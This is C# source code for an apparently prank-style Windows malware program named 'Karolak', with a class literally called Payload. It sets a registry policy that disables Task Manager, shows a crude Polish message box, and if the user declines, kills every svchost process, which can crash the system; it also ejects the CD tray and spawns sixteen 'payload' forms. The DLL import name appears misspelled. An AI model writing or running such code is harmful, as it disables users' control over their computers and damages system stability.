using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;

namespace Karolak
{
    class Payload
    {
        [DllImport("winm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLenght, int hwndCallback);
        public void BlockTaskMgr()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (key.GetValue("DisableTaskMgr") == null)
                key.SetValue("DisableTaskMgr", "1");
        }

            public void InsertKremowka()
        {
            DialogResult dialog = MessageBox.Show("Czy chcesz wyłączyć Karolaka?", "chuj cie to", MessageBoxButtons.YesNo);
            if(dialog == DialogResult.Yes)
            {
                try
                {
                    int result = mciSendString("set cdaudio door open", null, 0, 0);
                    Thread.Sleep(3000);
                    result = mciSendString("set cdaudio door close", null, 0, 0);
                }
                catch(Exception ex)
                { }
            }
            else
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes)
                {
                    proc.Kill();
                }
            }
        }
        public void payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        public void payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        public void payload3()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form4());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload4()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form5());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload5()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form6());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload6()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form7());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload7()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form8());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload8()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form1());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload9()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form10());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload10()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form11());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload11()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form12());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload12()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form13());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload13()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form14());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload14()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form15());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload15()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form16());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload16()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form17());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }
}
